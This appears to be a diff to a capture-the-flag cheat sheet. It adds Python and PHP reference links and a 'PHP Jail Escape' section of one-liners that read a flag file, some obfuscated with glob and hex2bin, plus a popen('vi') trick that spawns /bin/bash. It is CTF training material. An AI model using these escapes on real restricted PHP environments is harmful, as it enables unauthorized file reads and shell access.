@@ -94,17 +94,80 @@ hashcat -D1,2 -O --force -a $attack_type -m $hash_id $hash_list $pass_list
 
 ## Python
 
+### Python Functions
+
+* Files: [https://www.w3schools.com/python/python\_ref\_file.asp](https://www.w3schools.com/python/python_ref_file.asp)   
+* Strings: [https://www.w3schools.com/python/python\_ref\_string.asp](https://www.w3schools.com/python/python_ref_string.asp)   
+* Keyworks: [https://www.w3schools.com/python/python\_ref\_keywords.asp](https://www.w3schools.com/python/python_ref_keywords.asp)   
+* Random: [https://www.w3schools.com/python/module\_random.asp](https://www.w3schools.com/python/module_random.asp)   
+
 ### Dealing with Sockets
 
 [https://pequalsnp-team.github.io/cheatsheet/socket-basics-py-js-rb](https://pequalsnp-team.github.io/cheatsheet/socket-basics-py-js-rb)
 
 ### MISC
 
-```text
+```python
 #checks the output from crypto and sees if at least 60% is ascii letters and returns true for possible plaintext
 def is_plaintext(ptext):
     num_letters = sum(map(lambda x : 1 if x in string.ascii_letters else 0, ptext))
     if num_letters / len(ptext) >= .6:
       return True
+```
+
+## PHP
+
+### PHP Functions
+
+* Files: [https://www.w3schools.com/php/php\_ref\_filesystem.asp](https://www.w3schools.com/php/php_ref_filesystem.asp)   
+* Directories: [https://www.w3schools.com/php/php\_ref\_directory.asp](https://www.w3schools.com/php/php_ref_directory.asp)   
+* Errors: [https://www.w3schools.com/php/php\_ref\_error.asp](https://www.w3schools.com/php/php_ref_error.asp)   
+* Network: [https://www.w3schools.com/php/php\_ref\_network.asp](https://www.w3schools.com/php/php_ref_network.asp)   
+* Misc: [https://www.w3schools.com/php/php\_ref\_misc.asp](https://www.w3schools.com/php/php_ref_misc.asp)
+
+### PHP Jail Escape
+
+_With file\_get\_contents\(\)_
+
+```php
+print file_get_contents('flag.txt');
+```
+
+_With readfile\(\)_
+
+```php
+echo readfile("flag.txt");
+```
+
+_With popen\(\)_
+
+```php
+popen("vi", "w");
+
+:r flag.txt
+   or
+:!/bin/bash
+```
+
+_With highlight\_file\(\)_
+
+```php
+highlight_file(glob("flag.txt")[0]);
+   or
+highlight_file(glob("fl*txt")[0]);
+```
+
+_With highlight\_source\(\)_
+
+```php
+highlight_source("flag.txt");
+   or
+highlight_source(glob("*")[4]);
+```
+
+_With Finfo\(\)_
+
+```php
+new Finfo(0,glob(hex2bin(hex2bin(3261)))[0]);
 ```
 
